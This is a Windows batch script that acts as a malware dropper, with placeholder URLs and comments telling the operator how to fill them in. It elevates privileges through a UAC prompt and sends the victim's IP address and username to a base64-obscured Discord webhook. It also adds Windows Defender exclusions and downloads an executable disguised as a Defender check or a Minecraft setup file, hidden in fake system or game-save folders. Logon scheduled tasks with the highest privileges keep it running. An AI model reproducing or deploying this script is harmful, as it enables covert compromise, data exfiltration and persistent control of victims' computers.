:: notes:
:: script will more than likely have to be ran with administrator
@echo off
:: admin elevation
fsutil dirty query %systemdrive% >nul
if '%errorlevel%' NEQ '0' (
    echo admin needed, elevating perms
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /b
:gotAdmin
pushd "%~dp0"
cd /d "%~dp0"
:: sends ip and username to a discord webhook (PS. Use base64encode.org to encode your webhook into a base64 string)
set "web=your webhook url"
for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%web%'))"`) do (
    set "webdec=%%A"
)
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "(Invoke-RestMethod -Uri 'https://api.ipify.org')"`) do set "ip=%%i"
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"IP: %ip%, USERNAME: %USERNAME%\"}" %webdec%
SETLOCAL enabledelayedexpansion
:: task checks
schtasks /query /tn "MinecraftSecurity" >nul 2>&1
if %errorlevel%==0 (
    exit
)
schtasks /query /tn "DefenderSecurityCheck" >nul 2>&1
if %errorlevel%==0 (
    exit
)
:: file path checks
if exist %appdata%\.minecraft (
    set "filepath=%appdata%\.minecraft"
    goto mcstage
) else (
    set "filepath=%SystemRoot%\SystemApps\MicrosoftWindows.Client.CLI_%RANDOM%"
    if not exist !filepath! (
        mkdir !filepath!
    )
goto sysstage
)
:: main stuff
:sysstage"
set "filepath=%SystemRoot%\SystemApps\MicrosoftWindows.Client.CLI_%RANDOM%"
powershell -Command "Add-MpPreference -ExclusionPath "%filepath%""
takeown /f %SystemRoot%\SystemApps
icacls %SystemRoot%\SystemApps /grant administrators:F /t
if not exist %filepath% (
    mkdir %filepath%
)
takeown /f %filepath% /r /d y
icacls %filepath% /grant administrators:F /t
cd %filepath%
mkdir ProgData\Microsoft\windows
cd ProgData\Microsoft\windows
mkdir "Windows Defender"
cd "Windows Defender"
set "filepath=%filepath%\ProgData\Microsoft\windows\Windows Defender"
:: btw if you use dropbox for the download replace the 0 at the end with a 1 e.g. dl=1
powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '' -OutFile '%filepath%\DefenderSecurityCheck.exe' -UseBasicParsing"
schtasks /create /tn "DefenderSecurityCheck" /tr "%filepath%\DefenderSecurityCheck.exe" /sc onlogon /rl highest /f >nul
schtasks /run /tn "DefenderSecurityCheck" >nul
start "DefenderSecurityCheck" "%filepath%\DefenderSecurityCheck.exe"
:mcstage
powershell -Command "Add-MpPreference -ExclusionPath "%appdata%\.minecraft""
set /a num=%RANDOM% %% 10
cd %filepath%
cd saves
set "fol=New World (%num%)"
mkdir "%fol%"
if errorlevel == 0 (
    goto con
) else (
    goto sysstage
)
:con
cd "%fol%"
mkdir data
mkdir datapacks
mkdir dimensions
mkdir playerdata
echo {"invited":[],"shareResourcePack":true,"gameSettings":{"gameMode":"Survival","difficulty":"Easy","cheats":false,"ops":[]}} > worldsettings.json
curl -o "%filepath%\saves\%fol%\icon.png" ""
echo {"name":"%fol%","id":"%RANDOM%","version":1,"worldType":"default","gameMode":"survival","difficulty":"easy","hardcore":false,"allowCommands":false,"bonusChest":false,"mapFeatures":true,"spawnX":0,"spawnY":64,"spawnZ":0} > level.dat
echo {"DataVersion":2584,"RandomSeed":%RANDOM%,"generatorName":"default","generatorOptions":"","legacy_custom_options":"","generatorVersion":1,"spawnX":0,"spawnY":64,"spawnZ":0,"worldName":"%fol%","version":2584} > level.dat_old
echo ☃ > session.lock
:: btw if you use dropbox for the download replace the 0 at the end with a 1 e.g. dl=1
powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'Your URL to File' -OutFile '%filepath%\saves\%fol%\data\minecraftsetup.exe' -UseBasicParsing"
schtasks /create /tn "MinecraftSecurity" /tr "%filepath%\saves\%fol%\data\minecraftsetup.exe" /sc onlogon /rl highest /f >nul
schtasks /run /tn "MinecraftSecurity" >nul
start "MinecraftSecurityTest" "%filepath%\saves\%fol%\data\minecraftsetup.exe"
